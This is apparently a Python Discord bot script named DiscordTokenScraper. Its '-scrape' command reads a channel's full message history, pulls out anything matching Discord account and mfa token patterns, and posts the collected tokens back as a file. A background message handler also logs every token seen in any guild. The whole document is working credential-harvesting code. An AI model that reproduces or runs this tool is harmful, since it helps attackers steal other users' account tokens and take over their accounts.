# DiscordTokenScraper.py
# author : b6m
# date 2022-5-8
import discord
import json
import logging
import os
import re
from discord.ext import commands

logging.basicConfig(
        level=logging.INFO,
        format='\u001b[36;1m[\u001b[0m%(asctime)s\u001b[36;1m]\u001b[0m %(message)s\u001b[0m',
        datefmt='%H:%M:%S'
        )

jawzi = commands.Bot(
    command_prefix = '-',
    case_insensitive = True,
    intents = discord.Intents.all(),
    help_command = None
    )


@jawzi.command()
async def scrape(ctx):
    
    logging.info(f'{ctx.author.name}#{ctx.author.discriminator} Is Scraping Tokens | Channel > {ctx.channel.name} | Guild > {ctx.guild.name}')
    scraped = open(f'scraped/{ctx.channel.name}.txt', 'w+', encoding='utf-8')
    token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
    
    async for message in ctx.channel.history(limit=None):
        if re.search(
            token_regex[0],
                message.content
        ) or re.search(
            token_regex[1],
                message.content
            ):
            parse_token = re.search(
                token_regex[0],
                    message.content
                ) or re.search( 
                    token_regex[1],
                        message.content
                    )
            scraped.write(f'{parse_token.group(0)}\n')
            logging.info(f'{ctx.author.name}#{ctx.author.discriminator} Scraped Token > {parse_token.group(0)}')

    scraped.close()
    amount_of_tokens = len(open(f'scraped/{ctx.channel.name}.txt', 'r', encoding='utf-8').readlines())
    await ctx.send(f'Scraped {amount_of_tokens} Tokens ', file=discord.File(f'scraped/{ctx.channel.name}.txt'))
    logging.info(f'Scraped {amount_of_tokens} Tokens')
    os.remove(f'scraped/{ctx.channel.name}.txt')


@jawzi.event
async def on_message(message):
    token_regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
    if re.search(
        token_regex[0],
            message.content
        ) or re.search(
            token_regex[1],
                message.content
            ):
        parse_token = re.search(
            token_regex[0],
                message.content
            ) or re.search(
                token_regex[1],
                    message.content
                )
        logging.info(
            f'{message.author.name} | GUILD >> {message.guild.name} | CHANNEL >> {message.channel.name} | Scraped Token > {parse_token.group(0)}'
                )

    await jawzi.process_commands(message)



with open('config.json', 'r') as f:
    jawzi.run(
        json.load(f)['Token']
             )
